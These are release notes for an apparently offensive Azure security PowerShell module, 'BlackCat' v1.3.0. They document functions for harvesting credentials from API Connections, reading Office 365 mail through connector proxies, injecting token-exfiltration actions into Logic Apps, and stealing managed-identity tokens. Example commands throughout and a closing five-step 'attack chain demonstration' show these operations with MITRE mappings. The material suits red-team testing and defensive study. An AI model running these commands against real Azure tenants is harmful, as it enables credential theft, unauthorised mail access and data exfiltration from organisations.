# BlackCat v1.3.0 — "The Connector Conscription"

> If Azure won't give you the token, ask Azure to make the call for you.

## Overview

Since v1.0.0, BlackCat has expanded its public function count. The
underlying theme across the new additions: **use Azure's own trust relationships
against it.** API Connections, Logic Apps, Managed Identities, and federated
credentials are all now reachable through pipeline-ready PowerShell tooling.

28 files received an help text and code cleanup pass, shorter descriptions,
simpler control flow.

---

## Highlights

- **API Connection attack chain** — three new functions to enumerate, tokenize,
  and proxy through Azure API Connections, including OAuth-user delegated connections
  where the raw refresh token lives in Azure's internal vault.
- **Logic App workflow injection** — inject HTTP exfil actions into running Logic
  App workflows to capture IMDS tokens or exfiltrate connector data at runtime.
- **Federated token exchange** — extract UAMI bearer tokens via OIDC federation
  without deploying containers. RSA256 JWT signed locally, exchanged at Entra STS.
- **Container-less UAMI token extraction** — `Get-ManagedIdentityToken` uses
  Azure Deployment Scripts (`AzureCLI` kind) to curl the IMDS endpoint.
- **Help text audit & code quality** — 28 files cleaned up. Help text stripped of
  filler, replaced with direct technical descriptions. Repetitive `if/+=` chains replaced
  with hash lookups and pipelines. Unnecessary `$null =` assignments replaced with `[void]`.
- **`Add-EntraGroupMember` rename** — aliased back to `Add-GroupObject` for
  backward compatibility.

---

## API Connection Attack Chain

Three functions for discovering, extracting credentials from, and proxying through
`Microsoft.Web/connections` resources:

### `Get-ApiConnection`

Enumerates API Connections via Azure Resource Graph. Per-connection output includes:

- Authentication type classified as **OAuth-User**, **OAuth-SP**, **ApiKey**,
  **BasicAuth**, or **ManagedIdentity**
- Referencing Logic Apps (blast-radius mapping)
- Orphan detection — active trust grants with no consuming workflow
- Risk score (0–10) based on connector sensitivity, auth type, and orphan status
- `DynamicInvokeUrl` auto-built on every result for direct pipeline to `Invoke-ConnectorProxy`

```powershell
Get-ApiConnection -MinRiskLevel High -OutputFormat Table
```

### `Get-ApiConnectionToken`

Calls `listConnectionKeys`. Token availability depends on auth type:

| Auth Type | Token | Result |
|-----------|-------|--------|
| **ApiKey / BasicAuth** | yey | `StoredCredentials` extracted from `parameterValues` |
| **ManagedIdentity** | ney | Skipped — MI tokens are obtained at runtime from IMDS |
| **OAuth-User** | ney | `DynamicInvokeUrl` populated; OAuth refresh token is held in Azure's Logic Apps vault, not ARM |

For MI connections, `-ResolveManagedIdentity` follows: connection → consuming Logic App
→ identity type → role assignments → recommended attack path (federation for UserAssigned
MI, injection for SystemAssigned).

```powershell
Get-ApiConnectionToken -ResolveManagedIdentity -ResourceGroupName rg-prod -Name teams-conn
```

### `Invoke-ConnectorProxy`

Proxies API calls through the connection runtime. Two modes:

- **Direct**: Bearer token from `Get-ApiConnectionToken` → runtime URL
- **DynamicInvoke** (default): POST to ARM `dynamicInvoke` with current session token.
  Azure forwards the call as the consenting user. Works for OAuth-User connections
  where the token is vault-only.

Full pipeline:

```powershell
Get-ApiConnection | Where-Object ConnectorId -eq 'office365' | Invoke-ConnectorProxy -Path '/Mail/GetEmails'
```

MITRE: TA0009 / T1530

---

## Logic App Workflow Injection

`Invoke-LogicAppInjection` modifies a Logic App's workflow definition to inject HTTP
actions that execute in the LA runtime context.

### Modes

| Mode | Injected Actions | Exfiltrates |
|------|-----------------|-------------|
| **MIToken** | `FetchIMDSToken` + `ExfilToken` | ARM Bearer token from IMDS |
| **ConnectorData** | `ConnectorRead` + `ExfilData` | Connector API response |
| **Both** | All four | Token + connector data |

### Exfil Channels

| Channel | Method |
|---------|--------|
| **Webhook** | HTTP POST to callback URL |
| **BlobStorage** | PUT blob via LA managed identity — no SAS/key in definition |

```powershell
Invoke-LogicAppInjection -LogicAppName "HR-Integration" -ResourceGroupName "rg-prod" `
    -Mode MIToken -ExfilMode BlobStorage -StorageAccountName "myexfil" -TriggerWorkflow
```

MITRE: TA0006/T1528, T1565.001

---

## Federated Token Exchange

`Invoke-FederatedTokenExchange` obtains UAMI tokens via OIDC federation. No containers,
no deployment scripts, no ACI registration. Sign a JWT locally with an RSA private key,
POST it to the Entra token endpoint.

- Pre-provisioned OIDC issuer (storage account, anonymous blob access, `.well-known/` endpoints)
- `KeyId` auto-detected from published JWKS
- RSA-256 via `New-JWT` (`-RSA` parameter set, new)
- `-Cleanup` removes the federated credential after extraction
- Time to token: ~5s (vs ~60s for container-based approaches)

```powershell
Invoke-FederatedTokenExchange -Name "uami-prod" -ResourceGroupName "rg-prod" `
    -IssuerUrl "https://bcoidc.blob.core.windows.net/oidc" -PrivateKeyPath "./key.pem" -Cleanup
```

MITRE: T1528, T1098.001

---

## UAMI Token Extraction (Deployment Script)

`Get-ManagedIdentityToken` uses Azure Deployment Scripts (`AzureCLI`) to curl
the IMDS endpoint from inside a container, returning the UAMI's bearer token.

```powershell
Get-ManagedIdentityToken -ManagedIdentityId "<client-id>" -ResourceGroupName "rg-prod" -Decode -Cleanup
```

MITRE: T1528

---

## Reconnaissance & Discovery Improvements (main branch)

| Version | Change |
|---------|--------|
| **v1.2.12** | `Find-AzurePublicResource` `-FastMode` — reduced suffix set for triage |
| **v1.2.11** | `Find-AzurePublicResource` `-PrivateLinkOnly` — private endpoint only |
| **v1.2.9–10** | `Find-AzurePublicResource` performance — removed redundant CNAME lookups, empty-result caching |
| **v1.2.3** | Private Link CNAME resolution — surfaced CNAME targets for discovered hosts |
| **v1.2.1–2** | Private Link DNS permutations for 10+ services (Key Vault, Storage, SQL, Cosmos DB, Redis, Service Bus, etc.) |
| **v1.2.4** | Caching added to all Reconnaissance functions (`-SkipCache`, `-CacheExpirationMinutes`, etc.) |

---

## Infrastructure & Reliability

| Version | Change |
|---------|--------|
| **v1.2.6** | Az context change detection — token invalidation on `Connect-AzAccount` / `Switch-AzContext` |
| **v1.2.5** | Session state reset on service principal reconnect |
| **v1.2.7** | MITRE folder realignment — auth functions moved from Resource Development to Initial Access |
| **v1.2.8** | Auth state refactor — extracted `Clear-BlackCatAuthState` private helper |

---

## Help Text Audit & Code Quality

28 files cleaned up. Redundant filler removed from function descriptions. Repetitive
control flow patterns replaced:

| File | Before | After |
|------|--------|-------|
| `Read-SASToken.ps1` | 4 ArrayLists + 50-line if/+= chains | 4 hashtables + pipeline |
| `Get-EntraInformation.ps1` | `@() + foreach { if { += } }` | `Where-Object \| ForEach-Object` |
| `Get-AzResourceSecretList.ps1` | `@() += x; += y` | `@($x) + @($y)` |
| `Get-BlackCatCacheStats.ps1` | `@() + if +=` chain | `& { if... }` call operator |
| `Find-DnsRecords.ps1` | `$null = $Results.Add(...)` ×3 | `[void]$Results.Add(...)` |
| `Find-AzurePermissionHolder.ps1` | `$null = $Target -match` | `[void]($Target -match)` |

### `Add-EntraGroupMember`

`Add-GroupObject` renamed to `Add-EntraGroupMember`. Old name kept as an alias.
All internal callers and the module manifest updated.

---

## Set-ManagedIdentityPermission

- `-Remove` switch: deletes an app role assignment by `appRoleName`. No-op if
  the assignment doesn't exist.
- New alias `Set-ServicePrincipalPermission`

```powershell
Set-ManagedIdentityPermission -servicePrincipalName "uami-hr-automation" `
    -CommonResource MicrosoftGraph -appRoleName "User.Read.All" -Remove
```

---

## User Agent Refresh

`support-files/userAgents.json` updated from September 2023 versions to June 2026:

| Component | 2023 | 2026 |
|-----------|------|------|
| Chrome/Edge | 117 | 152 |
| Firefox | 118 | 152 |
| Safari | 16.6 | 19.4 |
| macOS | 13.5 | 26.5 |
| Opera | 102 | 121 |
| Vivaldi | 6.2 | 8.2 |
| Brave | 1.58 | 1.82 |

---

## Module Version: 1.3.0

### New Functions (feature branch)
- `Get-ApiConnection`
- `Get-ApiConnectionToken`
- `Invoke-ConnectorProxy`
- `Invoke-LogicAppInjection`
- `Add-EntraGroupMember` (renamed from `Add-GroupObject`)

### Previously Added (main branch, since v1.0.0)
- `Get-ManagedIdentityToken`
- `Invoke-FederatedTokenExchange`
- `ConvertTo-Base64Url`
- `Clear-BlackCatAuthState` (private)
- `New-JWT` (RS256 extension)

### Breaking Changes
- `Get-PublicBlobContent`: default changed from download to list. Use `-Download` to
  download files.
- `Invoke-LogicAppInjection`: result property `CallbackUrl` renamed to `ExfilTarget`.

### Backward Compatibility
- `Add-GroupObject` → `Add-EntraGroupMember` (old name preserved as alias)
- `Set-ServicePrincipalPermission` → alias for `Set-ManagedIdentityPermission`
- Reconnaissance caching parameters: opt-in, off by default

### Removed
- `Connect-ServicePrincipal` (replaced by `Connect-EntraApplication` / `Connect-GraphToken`)
- `Get-EntraRoleAssignment`, `Get-EntraRoleAssignmentMap` (removed in v1.0.0)

---

**Complete attack chain demonstration:**

```powershell
# 1. Discover high-value API Connections
Get-ApiConnection -MinRiskLevel High

# 2. Surface stored credentials (API keys) or detect OAuth-user connections
Get-ApiConnection -MinRiskLevel High | Get-ApiConnectionToken -ResolveManagedIdentity

# 3. For OAuth-user connections: proxy through ARM dynamicInvoke
Get-ApiConnection | Where-Object ConnectorId -eq 'office365' | Invoke-ConnectorProxy -Path '/Mail/GetEmails'

# 4. For MI-backed Logic Apps: inject exfil actions
Invoke-LogicAppInjection -LogicAppName "HR-Integration" -ResourceGroupName "rg-prod" `
    -Mode MIToken -ExfilMode BlobStorage -StorageAccountName "exfil" -TriggerWorkflow

# 5. For UAMIs with federation write: steal the token directly
Invoke-FederatedTokenExchange -Name "uami-prod" -ResourceGroupName "rg-prod" `
    -IssuerUrl "https://oidc.blob.core.windows.net/oidc" -PrivateKeyPath "./key.pem" -Cleanup
```

---

*Release date: August 4, 2026*
*MITRE ATT&CK: TA0001, TA0003, TA0006, TA0007, TA0009, TA0042, TA0043*
